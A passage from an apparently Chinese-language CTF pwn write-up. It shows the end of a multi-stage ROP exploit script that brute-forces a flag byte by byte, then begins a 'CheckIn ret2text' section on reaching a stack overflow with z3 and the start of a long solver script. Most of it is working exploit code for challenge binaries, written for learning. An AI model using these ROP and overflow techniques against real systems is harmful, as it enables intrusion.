l64(new_stack3)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x0000000000406a43 : add al, byte ptr [rax] ; add byte ptr [rax + 0x14], bh ; syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x000000000040884e : je 0x408855 ; movsb byte ptr [rdi], byte ptr [rsi] ; dec edx ; jne 0x408850 ; ret</span></span><br><span class="line"></span><br><span class="line">    payload3 = <span class="string">b&#x27;_&#x27;</span> * <span class="number">24</span></span><br><span class="line"></span><br><span class="line">    payload3 += l64(pop_rax_ret)</span><br><span class="line"></span><br><span class="line">    payload3 += l64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    payload3 += l64(pop_rdi_pop_ret)</span><br><span class="line"></span><br><span class="line">    payload3 += l64(<span class="number">3</span>)                  <span class="comment"># fd</span></span><br><span class="line"></span><br><span class="line">    payload3 += l64(<span class="number">0x5f5f5f5f5f5f5f5f</span>)</span><br><span class="line"></span><br><span class="line">    payload3 += l64(pop_rsi_pop2_ret)    </span><br><span class="line"></span><br><span class="line">    payload3 += l64(flag_addr)</span><br><span class="line"></span><br><span class="line">    payload3 += l64(<span class="number">0x5f5f5f5f5f5f5f5f</span>)</span><br><span class="line"></span><br><span class="line">    payload3 += l64(<span class="number">0x5f5f5f5f5f5f5f5f</span>)</span><br><span class="line"></span><br><span class="line">    payload3 += l64(syscall_pop_ret)</span><br><span class="line"></span><br><span class="line">    payload3 += l64(<span class="number">0x5f5f5f5f5f5f5f5f</span>)</span><br><span class="line"></span><br><span class="line">    payload3 += l64(pop_rdi_pop_ret)            </span><br><span class="line"></span><br><span class="line">    payload3 += l64(new_stack4)          <span class="comment"># bss</span></span><br><span class="line"></span><br><span class="line">    payload3 += l64(<span class="number">0x5f5f5f5f5f5f5f5f</span>)  <span class="comment"># fill rbp</span></span><br><span class="line"></span><br><span class="line">    payload3 += l64(<span class="number">0x401170</span>)            <span class="comment"># read stage3 ROP</span></span><br><span class="line"></span><br><span class="line">    payload3 += l64(<span class="number">0x401730</span>)            <span class="comment"># pop rsp ; pop r14 ; pop r15 ; pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line">    payload3 += l64(new_stack4)</span><br><span class="line"></span><br><span class="line">    payload4 = <span class="string">b&#x27;_&#x27;</span> * <span class="number">24</span></span><br><span class="line"></span><br><span class="line">    payload4 += l64(pop_rcx_ret)</span><br><span class="line"></span><br><span class="line">    payload4 += l64(<span class="number">0x40e000</span> - <span class="number">1</span> + <span class="number">5</span> - guess)</span><br><span class="line"></span><br><span class="line">    payload4 += l64(pop_rbx_pop3_ret)</span><br><span class="line"></span><br><span class="line">    payload4 += l64(<span class="number">0</span>)      <span class="comment"># rbx = 0</span></span><br><span class="line"></span><br><span class="line">    payload4 += l64(access_rcx)       <span class="comment"># r14</span></span><br><span class="line"></span><br><span class="line">    payload4 += l64(<span class="number">0x5f5f5f5f5f5f5f5f</span>) <span class="comment"># r15</span></span><br><span class="line"></span><br><span class="line">    payload4 += l64(<span class="number">0x5f5f5f5f5f5f5f5f</span>) <span class="comment"># rbp</span></span><br><span class="line"></span><br><span class="line">    payload4 += l64(pop_rax_ret)</span><br><span class="line"></span><br><span class="line">    payload4 += l64(flag_addr + index)</span><br><span class="line"></span><br><span class="line">    payload4 += l64(pop_rsi_pop2_ret)</span><br><span class="line"></span><br><span class="line">    payload4 += l64(<span class="number">0</span>) + l64(<span class="number">0</span>) + l64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    payload4 += l64(<span class="number">0x4011BE</span>)   <span class="comment"># mov bl, [rsi+rax]; mov rdi, rbx; push r14; ret</span></span><br><span class="line"></span><br><span class="line">    payload4 += l64(pop_rdi_pop_ret)</span><br><span class="line"></span><br><span class="line">    payload4 += l64(flag_addr)</span><br><span class="line"></span><br><span class="line">    payload4 += l64(<span class="number">0x5f5f5f5f5f5f5f5f</span>)</span><br><span class="line"></span><br><span class="line">    payload4 += l64(<span class="number">0x401170</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, p <span class="keyword">in</span> <span class="built_in">enumerate</span>([payload, payload2, payload3, payload4]):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> LOCAL:</span><br><span class="line"></span><br><span class="line">            <span class="built_in">input</span>(<span class="string">&#x27;stage%d?&#x27;</span> % (i+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(p) &gt; <span class="number">0xc0</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;payload2 too long: %#x&#x27;</span> % <span class="built_in">len</span>(p))</span><br><span class="line"></span><br><span class="line">        io.writeline(p)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        io.read_until_timeout(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> io.is_eof_seen():</span><br><span class="line"></span><br><span class="line">            io.close()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            io.close()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> ConnectionResetError:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line"></span><br><span class="line">        v = test(<span class="built_in">len</span>(flag), i)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> v:</span><br><span class="line"></span><br><span class="line">            flag += <span class="built_in">bytes</span>([i])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;flag = %s&#x27;</span> % flag)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h3><span id="checkin-ret2text">CheckIn ret2text</span><a href="#checkin-ret2text" class="header-anchor"></a></h3><p>连接上端口并且做了 PoW 验证之后，会发送回来一个 base64 的 ELF，打开之后发现是很多运算逻辑，最后在某个深处有一个栈溢出。但是为了达到这个栈溢出的位置，需要自动选择正确的输入到达这个路径。</p>
<p>看起来需要 “符号执行” 技术来达到这样的条件。不过由于对 angr 不太熟，同时也想尝试一下手糙 “符号执行” 的难度有多大，这里选择直接使用 z3 来做。不过这样的代价是，代码量有点收不住。。一道简单的栈溢出题目，写了 500 多行代码，有点超出预想了。。</p>
<p>仔细观察题目发回来的 ELF，我们可以发现以下两个特征：</p>
<ul>
<li><p>路径很多，但是实际上是一个二叉树结构，没有环形，也没有其他结构。而漏洞函数就在二叉树叶子节点的某个分支。</p>
</li>
<li><p>虽然验证代码比较长，但是总共只有两种，一种是输入几个数字，计算一道数学题；另一种是输入一段字符串，然后做一些位运算之后，与一个结果相比较。</p>
</li>
</ul>
<p>因此可以用以下思路来解决：</p>
<ul>
<li><p>先把 ELF 做反汇编，然后建立每一个指令和能达到的指令的关联。</p>
</li>
<li><p>遍历指令，找到溢出的地方在哪里。</p>
</li>
<li><p>根据第一步形成的关联，反向一直寻路到 main 函数起点（毕竟没有环路），并标记沿途中有多个出口指令的分叉选择。</p>
</li>
<li><p>最后再从 main 函数正向走到漏洞点，根据路径分叉选择来计算正确的输入是什么。如果是需要匹配的，那么用 z3 计算出正确的结果；如果不需要匹配的，那么随机生成一个输入即可通过。</p>
</li>
</ul>
<p>最后基于上述思路，添加亿点点细节，即可拿到 flag（可能是有史以来为一个 pwn 题写过的最长的代码）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> Solver, BitVec, BitVecVal, sat, unsat</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Ins</span>:</span><br><span class="line"></span><br><span class="line">    index: <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line">    addr: <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line">    exits: <span class="type">List</span>[<span class="built_in">str</span>]</span><br><span class="line"></span><br><span class="line">    opcode: <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line">    args: <span class="type">List</span>[<span class="built_in">str</span>]</span><br><span class="line"></span><br><span class="line">    choice: <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;%s: %s %s -&gt; %s&#x27;</span> % (<span class="variable language_">self</span>.addr, <span class="variable language_">self</span>.opcode, <span class="string">&#x27;,&#x27;</span>.join(<span class="variable language_">self</span>.args), <span class="variable language_">self</span>.exits)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_disasm</span>(<span class="params">filepath</span>):</span><br><span class="line"></span><br><span class="line">    valid = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    instructions = []</span><br><span class="line"></span><br><span class="line">    mapping = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    reverse_map = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(filepath):</span><br><span class="line"></span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;&lt;main&gt;:&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line"></span><br><span class="line">            valid = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;&lt;_Unwind_Resume@plt&gt;&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line"></span><br><span class="line">            valid = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> valid <span class="keyword">or</span> <span class="keyword">not</span> line.strip():</span><br><span class="line"></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        ary = line[:-<span class="number">1</span>].split(<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        addr = ary[<span class="number">0</span>].split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line"></span><br><span class="line">        instruction = ary[<span class="number">2</span>].split(<span class="string">&#x27;#&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line"></span><br><span class="line">        ary = instruction.split(maxsplit=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ary) == <span class="number">2</span>:</span><br><span class="line"></span><br><span class="line">            opcode, args = ary</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            opcode = ary[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">            args = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        args = args.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        ins = Ins(</span><br><span class="line"></span><br><span class="line">            index=<span class="built_in">len</span>(instructions),</span><br><span class="line"></span><br><span class="line">            addr=addr,</span><br><span class="line"></span><br><span class="line">            opcode=opcode,</span><br><span class="line"></span><br><span 